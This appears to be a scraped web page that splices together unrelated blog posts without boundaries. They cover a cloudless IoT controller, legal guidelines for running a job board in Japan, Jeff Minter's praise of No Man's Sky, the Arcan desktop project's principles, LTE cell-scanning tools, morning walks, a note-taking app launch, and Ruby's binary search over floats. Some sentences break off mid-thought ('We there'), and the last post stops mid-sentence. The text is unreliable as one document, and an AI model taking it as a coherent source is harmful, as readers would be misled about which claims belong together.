<p>But the most compelling reason to why use a cloudless IoT system is when Internet access is unavailable. At Thingsquare, we have been working with projects where the IoT system is deployed in rural Africa, where Internet access is spotty at best. And with projects in countries Internet access has been generally available, but where the IoT system has been inside a deep cellar where 4G access was&nbsp;impossible.</p>
<h2 id="the-challenges-of-cloudless-iot">The challenges of cloudless&nbsp;IoT</h2>
<p>Moving the IoT backend away from the cloud, closer to the IoT devices presents a number of&nbsp;challenges:</p>
<ul>
<li><strong>Authentication</strong>: authentication is significantly easier with the cloud, thanks to mechanisms such as 2 factor&nbsp;authentication.</li>
<li><strong>Remote access</strong>: providing remote access without the cloud is very difficult and in most cases&nbsp;impossible.</li>
<li><strong>Data processing</strong>: crunching numbers without having access to the abundance of storage and computation that the cloud provides is significantly&nbsp;harder.</li>
<li><strong>Software deployment</strong>: many IoT systems need data processing or similar mechanisms, and these systems are often designed to be run in the&nbsp;cloud.</li>
<li><strong>Software updates</strong>: software is a living thing and needs to be kept up to&nbsp;date.</li>
</ul>
<p>These issues result in trade-offs. Any IoT system that is deployed away from the cloud must be prepared to deal with&nbsp;them.</p>
<h2 id="a-practical-approach-to-a-cloudless-iot">A practical approach to a cloudless&nbsp;IoT</h2>
<p>Thingsquare takes a deliberately simple approach to the cloudless&nbsp;IoT:</p>
<ul>
<li>We run our IoT backend on a non-connected local&nbsp;controller</li>
<li>Deal with resulting the trade-offs on a case-by-case&nbsp;basis</li>
</ul>
<p>The local controller can run on a piece of hardware similar to a Raspberry Pi. The local controller is deployed on an on-site network and we provide a user interface over that network only. The user interface is accessible through a smartphone app, which can detect nearby local controllers via Bluetooth, and let users interact with&nbsp;devices.</p>
<p>The backend logic of the IoT application, which would normally run in the cloud, also runs on the local controller. This also means that the backend application must be scaled down to the limits of a Raspberry Pi-class&nbsp;device.</p>

</p>
</div>

</div>
</div>


<p>Since we cannot expect the local controller hardware to be as robust as a cloud host, particularly if the local controller is based on an <span>SD</span> drive, we limit disk writes by storing volatile data in memory. This means that software that runs on top of the API must be prepared to deal with having access to less&nbsp;data.</p>
<h3 id="user-authentication">User&nbsp;authentication</h3>
<p>To authenticate users, we use a two-tiered approach. The first tier is to leverage the existing access control to the local WiFi. If a user is authenticated to the local WiFi, this tier assumes that the user also should have access to the local controller and its devices. It is possible to configure the access level that such non-authenticated local users should&nbsp;have.</p>
<p>The second tier uses a hybrid approach: we use the cloud to authenticate the user and provide an access token to the local controller. The local controller announces its presence with encrypted Bluetooth beacons that the smartphone app uses to authenticate each user. This requires the users to have an account in the cloud. The app checks with the cloud server to match the encrypted beacon and the user account. If the user has access, the server responds with an access key to the local&nbsp;controller.</p>
<h3 id="device-authentication">Device&nbsp;authentication</h3>
<p>Device authentication is comparatively easier than user authentication, because devices can be preprogrammed with <span>TLS</span> certificates. We&nbsp;there</p>
<h3 id="software-delivery-with-a-git-repository">Software delivery with a git&nbsp;repository</h3>
<p>We deliver all software over a managed <a href="https://en.wikipedia.org/wiki/Git">git repository</a>. This repository can be updated by connecting the local controller to the Internet and requesting an update, or manually via a <span>USB</span>&nbsp;stick.</p>
<div>
<div>
<p>
For offline local controllers, software updates are provided via git repository, either distributed automatically via a temporary network connection or manually with a <span>USB</span> stick.
</p>
</div>
</div>

<h3 id="firmware-updates">Firmware&nbsp;updates</h3>
<p>Signed firmware update files are included in the git repository. Devices may request updates from the local controller, just as they do when they are connected to a cloud&nbsp;backend.</p>
<p>Because we use the full IoT backend software, <a href="https://www.thingsquare.com/blog/articles/network-updates">full-network <span>OTA</span> updates</a> work as&nbsp;usual.</p>
<h3 id="user-interface">User&nbsp;interface</h3>
<p>The local controller may present a user interface with a touch screen physically connected to the controller, or over the WiFi to smartphone apps on the same network. By default, the user interface is implemented via <span>HTML5</span>/JS/CSS and is updated via the git&nbsp;repository.</p>
<h2 id="conclusions">Conclusions</h2>
<p>The cloud is an integral part of the Internet of Things. But there are situations in which the cloud is not the best&nbsp;choice.</p>
<p>Thingsquare provides a local, cloudless IoT solution, based on the same software that is backing our cloud-based offering, that solves the problems with software delivery, user interface access, and firmware updates for the cloudless&nbsp;IoT.</p>

November 26, 2020 | https://www.tokyodev.com/2020/11/27/legally-operating-a-job-board-in-japan/ | <a href="https://web.archive.org/web/*/https://www.tokyodev.com/2020/11/27/legally-operating-a-job-board-in-japan/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>

<p>I started <a href="https://www.tokyodev.com/">tokyodev</a> as a side project, and when I first launched it, it never occurred to me that there might be legal repercussions for advertising job postings. However, in Japan, <a href="https://www.tokyodev.com/2020/10/01/recruiting-in-japan/">recruiting is a licensed industry</a>, with criminal penalties of up to a year in prison for practicing without a license, and depending on how a job board is run, it may be classified as recruiting.</p>

<p>Initially my clients were small startups, who weren't even aware of the licensing requirement. However, eventually a prospective client at a larger company was blocked by their legal team because I didn't have a license. This triggered me to investigate the implications of operating a job board in Japan with regards to recruitment licensing.</p>

<p>Fortunately, the employment security bureau has released <a href="https://www.mhlw.go.jp/www2/topics/seido/anteikyoku/minkan/">guidelines</a> that explicitly address the difference between providing a job board and recruitment. They aren't the easiest thing to read, even if you're a native Japanese speaker. I've included a rough <a href="#english">English translation</a> at the end of this article.</p>

<p>The gist of it is, because all the job opportunities on tokyodev are public, I don't solicit specific individuals to apply for jobs, and applications go directly to the companies without me doing any screening, I'm complying with the guidelines and thus don't need a license. Just to be safe, I was able to confirm directly with the employment security bureau that my interpretation is correct, and I'm operating tokyodev in a manner congruent with the guidelines. Furthermore, I was able to get some clarifications from them about some of the finer points.</p>

<p>With tokyodev, I sometimes provide companies with an email address on my domain where candidates can send an application. Applications in turn get forwarded to the company. I confirmed that's allowed, so long as I don't change the contents of the emails or screen the applications. I am allowed to filter out any spam though.</p>

<p>I also confirmed that the method of compensation is independent of whether or not I need a license. Whether I was to charge companies a flat fee to post a job, a fee upon successful hire like traditional recruiters do, or even if I was to post jobs for free, it wouldn't make a difference with regards to licensing requirements.</p>

<p>I still sometimes have companies asking me if I have a license, but since I've been able to point them to the guidelines, I've been able to move forward with them despite not having one.</p>

<p><em id="english">Translation of <a href="https://www.mhlw.go.jp/www2/topics/seido/anteikyoku/minkan/">the Japanese guidelines</a> follows. Please note that the translation was done by someone who's not an expert in the area, and so shouldn't be relied upon for more than getting an overview of the guidelines.</em></p>

<h2 id="guidelines-to-distinguish-between-providing-information-of-job-seekers-and-job-offers-and-employment-placement-on-the-internet-by-a-private-company">Guidelines to distinguish between providing information of job seekers and job offers, and employment placement on the internet by a private company</h2>

<p>Guidelines to judge whether or not an online job site run by a private company is deemed to be an “employment placement” prescribed by Article 4-1 of Employment Security Law are determined as follows. If a person is going to do a business defined as “employment placement” by these guidelines, he/she needs to be approved by Minister of Health, Labor and Welfare. Each item has a specific example.</p>

<h3 id="background">Background</h3>

<p>1. Article 4-1 of Employment Security Law defines “employment placement” as “to accept job posting and job application and to encourage employment agreement between recruiters and job seekers. Therefore, an online site which only provides information of recruiters and job seekers, and does not accept job applications nor encourage employment agreements is called “information provider” and is not deemed to be “employment placement” with need to be legitimately approved.</p>

<p>2. However, recently, providing information of recruiters and job seekers on the internet has been increasing, and some of them have been changing their roles from just being “information providers” to something more than just enabling to browse information of recruiters and job seekers. This includes enabling mutual communications between recruiters and job seekers as well as establishing a way to automatically send information that matches recruiters’ requirements and/or job seekers’ qualifications. Of course, not all of them are deemed to be an “employment placement”, but there are some cases that are difficult to determine whether or not it should be deemed to be an “employment placement”. This is why these guidelines were created.</p>

<h3 id="guidelines-to-determine-if-an-online-job-site-run-by-a-private-company-is-just-an-information-provider-or-employment-placement">Guidelines to determine if an online job site run by a private company is just an information provider, or employment placement</h3>

<p>I. These guidelines are to make clear the difference of “recruiters and job seekers’ information provider” and “employment placement” on the internet in order to secure adequate operation of the law.</p>

<p>II. In these guidelines, “providing recruiters and job seekers’ information on the internet” means that an information provider allows recruiters and job seekers to view job information (both includes information that enables people to identify individual recruiter or job seeker such as company’s name and address, job seeker’s name and address, which will be called just “information” hereafter) on its homepage.
Besides, it includes providing additional services for job seekers or recruiters, such as providing a convenient way to create and send emails for job application or recruitment.</p>

<p>III. If an online recruiters’ and job seekers’ information provider matches either of following 1 to 3, it is deemed to be an employment placement.</p>

<ol>
  <li>Without objective and explicit search criteria set in advance, information provider chooses and changes the contents of information or who it is providing.</li>
  <li>Information provider informs job seekers of job information, or inform recruiters of job seekers’ information. (Example 2)</li>
  <li>When communications between job seekers and recruiters are relayed via information provider’s homepage, it changes the contents for the communication. (Example 3)</li>
</ol>

<p>IV. Besides III, based on the contents of information provider’s advertisement, and/or the contents of contracts between information provider and job seekers or recruiters, if information provider is introducing job seekers to recruiters or recruiters to job seekers, and providing information of job seekers and recruiters on the internet is conducted as a part of it, it is overall deemed to be an employment placement. (Example 4)</p>

<h4 id="example-2-information-provider-itself-encourages-job-applications-or-hiring">Example 2: Information provider itself encourages job applications or hiring</h4>

<p>Although when information provider proactively contacts job seekers or recruiters to encourage applying or hiring, adjusts schedule for job interviews, or provides additional information, and it is considered just to assist recruitment successes, it is deemed to be an employment placement.</p>

<p>However, even when all of these are conducted online, it is considered that information provider and job seekers or recruiters only use emails as a substitute communication tool for job interview, telephone, fax or mails. Therefore, it does not influence on judging whether or not it is deemed to be an employment placement.</p>

<h4 id="example-3-job-seekers-or-recruiters-to-apply-for-a-job-or-recruit-people-by-emails-via-homepage-of-information-provider-but-still-information-provider-is-not-deemed-to-be-an-employment-placement">Example 3: Job seekers or recruiters to apply for a job or recruit people by emails via homepage of information provider, but still information provider is not deemed to be an employment placement</h4>

<p>If information provider is only providing necessary email addresses without changing the contents of communications when information provider allows job seekers or recruiters to send emails to recruiters or job seekers via its homepage in order to apply for a job or recruit people directly online, it is not deemed to be an employment placement.
Also, regarding the emails, when information provider has a specific form to allow job seekers or recruiters to fill in necessary information and create emails, it is not deemed to be an employment placement.</p>

<h4 id="example-4-advertisement-targeting-job-seekers-and-job-recruiters-as-an-employment-placement">Example 4: Advertisement targeting job seekers and job recruiters as an employment placement</h4>

<p>If information provider recruits job seekers or recruiters by saying something like “we will find a job you are looking for” or “we will introduce candidates who will fit your company”, and provides potential recruiters or job seekers information such as names and phone numbers to job seekers or recruiters on the internet, it is deemed to be an employment placement as a whole.</p>

<p>“On the eve of the next generation” of game consoles (the new Sony PS5 and Microsoft Xbox Series X), <a href="https://www.gamesradar.com/edge/"><em>Edge</em> magazine</a>, in issue #352 (Christmas 2020 issue), is running an article entitled “Games Of The Generation.” The piece includes a variety of industry notables sharing their pick of a game released since the arrival of the PS4 and Xbox One worthy to receive this title.</p>



<p>The list is comprised of 20 games, their advocates describing their reasons for bestowing such singular note upon them. Some are extremely well known — <em>Red Dead Redemption 2</em>, <em>The Legend of Zelda: Breath of the Wild</em>, <em>Ico</em> — while others are less so. And among them is Hello Games’ <em>No Man’s Sky</em>. </p>



<figure><blockquote><p>“…our Games Of The Generation awards go to the crème de la crème — those Edge has judged to represent the pinnacle of game design as we know it today.”</p></blockquote></figure>



<p>Within, legendary developer and founder of Llamasoft, <a href="https://en.wikipedia.org/wiki/Jeff_Minter">Jeff Minter</a>, has named <em><a href="https://www.nomanssky.com/">No Man’s Sky</a></em> his Game Of The Generation. With a development career that began in 1981 with titles for the Sinclair ZX80 micro, Minter is known for a great many (and frequently psychedelic) titles across many platforms, including 8 and 16-bit Ataris, C64, Amiga, Nuon, PC, iOS, Xbox 360, and PS4. Some of his most notable titles include <em><a href="https://en.wikipedia.org/wiki/Gridrunner">Gridrunner</a>; <a href="https://en.wikipedia.org/wiki/Hover_Bovver">Hover Bovver</a>; <a href="https://en.wikipedia.org/wiki/Attack_of_the_Mutant_Camels">Attack of the Mutant Camels</a>; <a href="https://en.wikipedia.org/wiki/Neon_(light_synthesizer)">the Virtual Light Machine/Neon</a>; <a href="https://en.wikipedia.org/wiki/Space_Giraffe">Space Giraffe</a>; <a href="https://bytecellar.com/2008/07/12/i_remember_how/">Tempest 2000, 3000</a>, <a href="https://en.wikipedia.org/wiki/Tempest_4000">4000</a>; <a href="https://en.wikipedia.org/wiki/TxK">TxK</a>,</em> <em>the iOS <a href="https://toucharcade.com/2011/01/06/jeff-minters-minotaur-rescue-charges-into-the-app-store/">Minotaur Project</a></em>; and <em><a href="https://en.wikipedia.org/wiki/Polybius_(2017_video_game)">Polybius</a></em>.

<p>Soon after the launch of <em>No Man’s Sky</em> back in 2016, Minter began tweeting his enjoyment exploring the wild and alien, procedurally generated worlds that Hello Games had brought into being. <a href="http://minotaurproject.co.uk/blog/?p=380">A post on his blog</a> from September 2106 (don’t let the title fool you) expresses the degree to which the game had impressed him. (His post was included in a list of articles reacting to <em>No Man’s Sky</em> on the first post made from <em>this</em> blog, <a href="https://nmsspot.com/2016/09/01/a-few-words-about-the-best-game-ive-ever-played-no-mans-sky/">“A Few Words About the Best Game I’ve Ever Played: ‘No Man’s Sky’”</a>, on September 1, 2016.) </p>



<p>A brief excerpt from Minter’s assessment of No Man’s Sky (shown in full, above), follows. </p>



<blockquote><p>Regarding a ‘game of the generation’, I think for me it’d have to be No Man’s Sky. Even back at the very start when there wasn’t a great deal of complex gameplay in it (and the developers were taking a right kicking for that), nonetheless I thought the style was fantastic (recreating almost perfectly the style of 1970s sci-fi book covers) and remarkably creating an explorable universe in that style was quite an amazing achievement. …</p></blockquote>



<p>This nod from industry veteran Jeff Minter is mighty kudos, indeed, for Hello Games and the universe they have created with <em>No Man’s Sky</em>. And, thinking about it, this seems a rather apt post to have put together on Thanksgiving Day!</p>

      <div>
        <article lang="en">
          
          <p>This post is an overview of the guiding principles driving much of the
work behind the main parts of the <a href="https://arcan-fe.com/">Arcan Project</a>. For
those unaware, Arcan is presented as something as uncommon as a ‘desktop
engine’. The grand claim is that modifying and understanding the entirety of
your desktop should be ‘patching scripts’ level easy if we rework current
popular abstractions and adjust the division of labour.</p>

<p>The principles themselves link together to tell a large chunk of the vision of
the ‘divergent desktop’; a story that has been slowly getting its shape over
many years, greatly influenced by a number of publicly documented experiments
as well as seminal works such as Von Neumann’s “The Computer and the Brain”,
Norbert Weiner’s “The Human use of Human Beings”, Ian Hacking on “Representing
and Intervening”, Jaron Lanier’s trilogy on what the future may hold in store,
as well as the nowadays less digestible amalgamation of +Fravia’s Search Lores.</p>

<p>The overview is quite a long read in its own right, and full versions of each
principle will be added as individual articles over time – If the contents in
the sections here comes off as a bit dense and hard to ingest, fret not! They
are more teasers or appetisers, the full course meal will have better pacing
and technical depth.</p>

</ol>

<h2 id="backstory-and-motivation">Backstory and Motivation</h2>

<p>The Arcan project, at its core, is rooted in assumption that the ‘desktop’ way
of interfacing with computing is inching towards its last of breaths, and
rewriting X11 or JSONifying STDOUT won’t provide much more air than for a final
gasp.</p>

<p>The upside is that this may well turn out to be something positive that
provides opportunity for radical simplification and restructuring of the myriad
of technologies that make out the Rube Goldbergian contraption that is the ‘modern’
desktop.</p>

<p>The first non-academic presentation (<a href="https://youtube.com/watch?v=07nqZIFRDJg">video</a>)
on the Arcan project had a terse, technical-overview style to it, with very little
in terms of motivation or actual intended direction.</p>

<p>The reason for that was that I wanted to keep the attention and focus on “what it is”
rather than “what will it ever be used for”, and carefully note who tries to fill
in the cryptic blank spaces, and with what. This was predicated on the belief
that honest dissemination is done by first demonstrating the feasibility and
soundness of the fundamentals of the tech in isolation; flowery visions,
soap-boxing and sociopolitical annotation are best left deferred to separate
stages should the underlying tech be sufficiently coherent and robust.</p>

<p>It is not, however, some vacuous perspective of the technology as living a life
disjunct from the social consequences of its application, but having that as
the goto default mental model for any fledgling utterances is as much of a
fool’s errand as thinking that it should never be viewed through the optics of
an abstract larger social organism.</p>

<p>The basic motivation for <em>all</em> of this is as follows:</p>

<blockquote>
  <p>I am of humble needs and wants: I want to expand my agency, security, safety and quality of experience in regards to all things that computing touch. The largest obstacle to that expansion, right now, is the chaos and complexity of user-space, the dependency creep towards an online ‘service-space’, the peering eyes this ‘service space’ uses to study and repackage some naive interpretation of ‘you’, and how this service space is being used to mutate social- and critical- infrastructure towards something wholly frightening.</p>
</blockquote>

<p>On a personal level, I have coded and experimented with virtually everything
computing since the days of the venerable C-64 (divide it by two, flip it over,
that’s 23) – viruses, anti-viruses; drm protections, cracks; database
engines; operating system kernels; cheats, bots and anti-cheats; emulators
(both interpreter dance and JITterbug); demos; games; parsers for more
formats than I can remember; exploits as well as mitigations. I have worked in
academia, government, military-industrial, fortune-500 as well as fledgling
startups, and got the scars and theses to prove it. The ‘left to observe’ list
has grown rather short over the years.</p>

<p>During this time, the evolution of the capabilities of the devices themselves
have exceeded all expectactions and is nothing short of spectacular. The
hardware and software lockout which plagued the early days is, relatively
speaking, minor; access to both capable devices and deep technical information
has become absolutely stellar, overwhelmingly so. The days of begging companies
for scraps of hardware; scraping public libraries and dumpsters for slices of
information; for quid-pro-quo trading of hacker ‘secrets’ and basic software
building blocks (‘warez’) are mostly faint memories. Hopefully they will remain
as such in spite of troubling signs up ahead.</p>

<p>The counterweight to this positive development is that things have become complex
to the degree that a thorough and deep understanding, <em>preconditions</em> to responsible
control and agency, is a hard thing to come by, and an even harder thing to fight
for. Just add more dependencies and layers! Get it to market! Cash out! Build a
community! Become its figurehead! Sell the community! Pass the plate! Don’t forget
to Like Comment and Subscribe! Oh and this message was sponsored by yet another
pointless VPN from a provider you can’t trust but somehow protects you from a
network you don’t trust. With such words the once so tiny tech snowball continues
its merry way down the mountain towards the village.</p>

<p>No matter the outcome, I have more things on the immediate ‘todo’ in terms of
creative things alone – than I have hours left to live, regardless of how many
those turn out to be. That is a pleasant mental image to fall back on in times of
gloom and doom.</p>

<p>My dedication to this project and the tens of thousands of invested hours has
been described as both ‘a labour of love’ as well as the more colloquial
‘fucking insane’, though personally, I view it as an act of necessity.</p>

<p>Many a times the journey has felt like digging out of a prison using the
collarbone of a fallen mate as a makeshift shovel, fuelled by the vapours of
some faint hope that there is a relatively more free world waiting within
reach, and that the proverbial roses I can smell are not just a hallucinogenic
side effect from some invisible gas deposit that this old canary has stumbled
upon.</p>

<p>The motivation is not all some evolutionary struggle for freedom. The rest
comes from bitter anger, even resentment, towards the dominant status quo and
the trajectory that computing interfaces as a whole is moving along; pandering
to trivial attention grabbing nonsense (‘engagement’) rather than crafting
sharper tools that can claw at the delicious problems that the future holds in
store.</p>

<h2 id="principle-1-professionals-first">Principle 1: Professionals First</h2>


<p>The traditional desktop is a compromise of interests, with the more recent bias
being towards appealing to a supposed ‘mainstream’ audience. This made sense
from an economical growth standpoint within the kinetics of the peculiar brand
of capitalism at the time; the previous demographic was already hooked on the
computing drug - being ‘users’ after all.</p>

<p>The thing nowadays is that the load-bearing mainstream audience is opting out at
a rapid rate and for good reason; smartphones, tablets, digital ‘assistants’,
gaming consoles and so on are all chopping up the generic ‘desktop’ into more
controlled corporate thiefdoms.</p>

<p>Many of the past compromises that were made in order to accomodate this wider
and less experienced audience are also unnecessarily restricting agency,
precision and and efficiency for those (‘the professional’) who possess both a
stronger mental model of computing, and a vested interest in its advancement.</p>

<p>It makes little sense to try and convince your grandmother that she needs a
Free! Open-Source! desktop, and it is a farce, bordering on self-harm, to still
use that scenario as part of some requirement specification for the future.</p>

<p>That aside, the ‘professional’ here is not meant as a vain appeal to exclusionary
hacker elitism – before the numbers of those within such lines dip towards that
of past ‘biker freedom’ seekers such as radio ‘amateurs’, circuit benders and
BBS operators. The ‘professional’ is acknowledging that there is a large number
(millions) of key individuals in a wide gamut of professions that are currenty
wasting much of their time and talents thanks to misguided attempts at software
ergonomics that will try and make due with what the web can give them, but they
should not have to.</p>

<p><em>Revisit past workflows, put the professional first.</em></p>


<h2 id="principle-2-diversify-experience">Principle 2: Diversify Experience</h2>

<p>A long standing maxim in computing is that of ‘mechanism, not policy’. From
a user experience perspective, it is rooted in the assumption that the user
is both willing- and capable- of leveraging mechanisms and configure them into
their own sets of policies. This has largely failed in the ‘desktop’ sense,
and very much stagnated in the command-line processing one.</p>

<p>There are many possible reasons for this, and one likely culprit on a high
level is the marketing gospel of ‘it just works’. This is a rhetoric which
strongly favours a ‘brand identity’ preset of strict policies and aesthetics
at the desktop level and beyond. Its implementation allows for little to no
accessible layering in between the opaqueness of a UI element such as a
‘button’ and the set of actions the idea of it ‘working’ represents.</p>

<p>This turns into a problem when your personal expectations of what ‘just works’
happens to clash with those of the …</p></article></div></div></div>

<h2>LTE Tools</h2>
<h2>Introduction</h2>
<p>This is a collection of open source software (OSS) tools to locate and track LTE basestation cells using very low performance RF front ends. For example, these tools work with RTL2832 based dongles (E4000, R820T, etc.) which have a noise figure of 20dB, only 8 bits in the A/D, and a crystal with a frequency error of about 100 PPM. In fact, since the LTE downlink center frequencies are accurate to within 0.050 PPM, these tools can be used to calibrate the receiver's oscillator.</p>
<ul>
<li><a href="http://www.evrytania.com/lte-tools/78-default-category/77-lte-cell-scanner">LTE Cell Scanner</a>&nbsp;is a tool that will scan a set of frequencies and identify LTE carriers. It also decodes the MIB.</li>
<li><a href="http://www.evrytania.com/lte-tools/78-default-category/78-lte-tracker">LTE Tracker</a> is a realtime tool that continuously identifies and tracks all the LTE cells on a particular frequency.</li>
</ul>
<p>This code was developed on an Ubuntu 12.04 system but has also been <a href="http://superkuh.com/rtlsdr.html#ltescanner" target="_blank">made to work on Ubuntu 10.04</a>.</p>

<p>Every day I go for a 45-minute walk first thing in the morning. I’ve been doing it for almost two months now, I think. And it has become one of the most essential parts of my daily routine.</p>



<p>Walking awakens my mind and my body. It makes me feel energized, sharp and clear-headed. It helps me disentangle my thoughts, digest experiences and see unfamiliar patterns.&nbsp;</p>



<p>Maybe that’s why it’s so easy for me to write while I walk. Why it comes so naturally. I hate to admit it, but for some reason I struggle to write standing still. I need cadence. I need movement.</p>



<p>When I walk, my mind and my body move together. They ride and go along in unison, creating a feeling of immense tranquillity and equilibrium. Even when I’m witnessing dark or conflicting thoughts, it all flows smoothly.</p>



<p>I’ve always like walking. And I think I’ve also known for a while how much it helps me. Despite that, though, it was never a consistent habit. It was always occasional.</p>



<p>But now I seriously doubt I could go on with my life without doing it every day. I would go mad. Especially now that I call myself a creator.</p>



<p>Walking has become not just indispensable to my work and productivity, but also to my happiness and well-being — it is a form of self-care, even therapy.</p>

<p>As I write this, British Columbia and many parts of the world are entering another lockdown to curb the second wave of COVID 19. We’ve found ourselves with an abnormal amount of free time, but how many of us have actually used that time to make the changes we said we were going to at the start of January 2020. I spent the last couple of years trying to find the app I want to use to manage my thoughts and reflection. I (un)fortunately came to the conclusion to build my own and am happy to introduce <a href="https://engram.xyzdigital.com/">Engram – an open source knowledge management tool</a>.</p>

<p>Most years I make it to about February before I lose track of my New Years’ Resolution. This year I set the goal to check in with myself on a weekly basis. Somewhat unintentionally, I found myself setting a new resolution each week. One week I realized how tired I was, so I shifted my bedtime earlier. Another week I challenged myself to finish a whole book (something that would previously take me months to accomplish).</p>

<p>Despite losing at least two weeks <a href="https://adam.xyzdigital.com/personal/two-weeks-of-covid">recovering from COVID</a> and everything going on around the world, I am on track for one of my favorite years. Checking in with myself has helped me find the things I really want to be doing. Every time I accomplish one of those weekly goals I get a boost of confidence.  Even when I don’t meet my goals I usually make it much farther than I would have without them.</p>

<p>When I was still in school, I was an avid note taker. On the personal side of things, I kept a shared journal with people that I dated.  I didn’t comprehend why writing things down would be useful for just myself, so having someone to share it with was good motivation. In the classroom, I started a new page of notes for each class every day. Like most other students, I was excited to make it to the end of the year and take my notebook to throw out all my hard work.</p>

<p>Each year the same thing repeated. I did well enough that I assumed my strategies were working.  It wasn’t until university that I realized the importance of re-reviewing notes after writing them.  Many times I wrote out some math or code, understanding none of it. After I slept that night and took another look, I was usually able to make better sense of it.</p>

<p>2018 started with a very similar resolution: “figure out what I want to do with my life”. I had just left a job after completely burning myself out. A knee injury from two years earlier had developed in to severe chronic pain – making it difficult to sit for more than 20 minutes at a time. Something wasn’t right and I needed to find an answer.</p>

<p>I took the next three months off. This is when I started journaling more consistently. Each day was a new opportunity to try something different and see how it made me feel. When I reached the end of the day I would reflect on what I did and how it made me feel. By the end of the second month, I felt my soul returning to my body. I rediscovered my passion for all forms of software development and this is a realization I plan to stick to.</p>

<p>I’ve written about the <a href="https://adam.xyzdigital.com/tech/software/spring-cleaning">digital mess I got myself into</a> trying to move my knowledge management process to the cloud. I’ve tried what feels like every app with the word “Note” in it. Each one has some quirk that gets in the way of my creativity.</p>

<p>I sat down – actually <a href="https://adam.xyzdigital.com/personal/breadth-first-search-a-walk-in-the-park-chapter-one">went for a walk</a> - to ponder what the absolute minimum viable product would be.  I landed on an app that allows you to quickly enter thoughts without any friction along the way. With just the click of the icon, you are immediately ready to enter a new note.</p>

<blockquote><p lang="und" dir="ltr"><a href="https://t.co/pivIRHQWpk">pic.twitter.com/pivIRHQWpk</a></p>— Shower Thoughts (@TheWeirdWorld) <a href="https://twitter.com/TheWeirdWorld/status/677881012785844224?ref_src=twsrc%5Etfw">December 18, 2015</a></blockquote>


<p>Like Twitter, but for your private thoughts</p>

<p>This doesn’t sound like much, but I’m already ~100 commits in on <a href="https://github.com/adamjberg/engram">Github</a> and have been actively developing it for just over month. This is the start of something much bigger.</p>

<p>Interested? Here’s what you can do to get involved:</p>

<ul>
  <li>Follow <a href="https://twitter.com/devtails">@devtails</a> for development tales along the way</li>
  <li>Follow <a href="https://twitter.com/engram_app">@engram_app</a> on Twitter for updates about the app</li>
  <li>Follow <a href="https://www.tiktok.com/@engram_app">@engram_app</a> on TikTok for the occasional video</li>

<p>Finally, I will be using the app to build out a curriculum for learning software development. If you are learning to code or already know how but want to learn more, this will be a great opportunity to learn everything from the basics of starting a simple web application to more advanced topics like automating deployments via Github actions.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content"> <article itemscope="" itemtype="https://schema.org/BlogPosting">  <div itemprop="articleBody"> <p>What’s the midpoint between 0 and infinity? Well the answer differs depending on whether you are asking a mathematician, philosopher, or a Ruby developer. I’m not a mathematician or a philosopher, but I am a Ruby developer, so I can tell you than 1.5 is the midpoint between 0 and infinity.</p>  <p><a href="https://ruby-doc.org/core-2.7.2/Range.html#method-i-bsearch"><code>Range#bsearch</code></a> performs binary search within a range. For example, lets use it to find the first integer that’s larger than 42 (which is 43) and see the values it inspects to find it.</p> <div><div><pre><code><span>values</span> <span>=</span> <span>[]</span>

<span>found_value</span> <span>=</span> <span>(</span><span>0</span><span>..</span><span>).</span><span>bsearch</span> <span>do</span> <span>|</span><span>i</span><span>|</span>
  <span>values</span> <span>&lt;&lt;</span> <span>i</span>
  <span>i</span> <span>&gt;</span> <span>42</span>
<span>end</span>

<span>puts</span> <span>"The integer larger than 42 is: </span><span>#{</span><span>found_value</span><span>}</span><span>"</span>
<span>puts</span> <span>"The following values were inspected:"</span>
<span>puts</span> <span>values</span>
</code></pre></div></div> <p>And when we run it, we get the following output:</p> <div><div><pre><code>The integer larger than 42 is: 43
The following values were inspected:
1
2
4
8
16
32
64
32
48
40
44
42
43
</code></pre></div></div> <p>We see typical binary search behavior.</p> <p>A co-worker recently asked me about some odd behavior when we change the starting value to a float. For example, consider the following code, which is the same as the one above but the range is between 0 and <code>Float::INFINITY</code>:</p> <div><div><pre><code><span>values</span> <span>=</span> <span>[]</span>

<span>found_value</span> <span>=</span> <span>(</span><span>0</span><span>..</span><span>Float</span><span>::</span><span>INFINITY</span><span>).</span><span>bsearch</span> <span>do</span> <span>|</span><span>i</span><span>|</span>
  <span>values</span> <span>&lt;&lt;</span> <span>i</span>
  <span>i</span> <span>&gt;</span> <span>42</span>
<span>end</span>

<span>puts</span> <span>"The float larger than 42 is: </span><span>#{</span><span>found_value</span><span>}</span><span>"</span>
<span>puts</span> <span>"The following values were inspected:"</span>
<span>puts</span> <span>values</span>
</code></pre></div></div> <p>We then get the following output when we run it (note that the output has been truncated because it’s too long):</p> <div><div><pre><code>The float larger than 42 is: 42.00000000000001
The following values were inspected:
1.5
1.6759759912428246e+154
1.5921412270130977e+77

42.424560546875
42.1746826171875
...
</code></pre></div></div> <p>The first few values we inspect in the binary search are rather odd: <code>1.5</code>, <code>1.6759759912428246e+154</code>, <code>1.5921412270130977e+77</code>, etc. Where do these numbers come from? To explain these values, we first have to understand how IEEE 754 floating-point numbers work.</p>  <p>Ruby floats are double-precision IEEE 754 floating-point numbers. If you don’t know the basics about how floating-point numbers are represented in memory, there are plenty of resources on the internet, <a href="https://fabiensanglard.net/floating_point_visually_explained/">here’s one</a>.</p> <p>Of special interest to us is how infinity is represented in floating-point. Infinity is a special value where the exponent bits are all 1’s and the significand bits (also known as fraction or mantissa) are all 0’s.</p>  <p>Ruby’s <code>Range#bsearch</code> is implemented in a C function called <a href="https://github.com/ruby/ruby/blob/5512de76033773a77f686f3cb2adc849356f7674/range.c#L680"><code>range_bsearch</code></a>. There are several cases it deals with, and the one of interest is the case when either endpoint is a float. In this case, it performs a clever trick. It reads the C double type of the Ruby float endpoints as 64-bit integers (<code>int64_t</code>)<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup>. Note that this is <strong>not</strong> the same as casting the double into integer type, this is directly reading the double as a 64-bit integer. Are you confused? I sure was when I first read this code so if you are too, it’ll make more sense later on. Trust me.</p> <p>Let’s revisit how infinity is represented in floating-point. Here’s it visualized (through the help of the amazing website <a href="https://float.exposed/">float.exposed</a>). We can see that the sign is 0 (this is a positive value), all exponent bits are 1, and all significand bits are 0.</p> <figure> <img src="https://blog.peterzhu.ca/assets/ruby-range-bsearch/infinity.png"> </figure> <p>And of course, <code>0</code> is represented in floating-point with all the bits set to 0.</p> <figure> <img src="https://blog.peterzhu.ca/assets/ruby-range-bsearch/zero.png"> </figure> <p>So what if we read these bits of the endpoint as if they were integers? Then our range would be between <code>0</code> 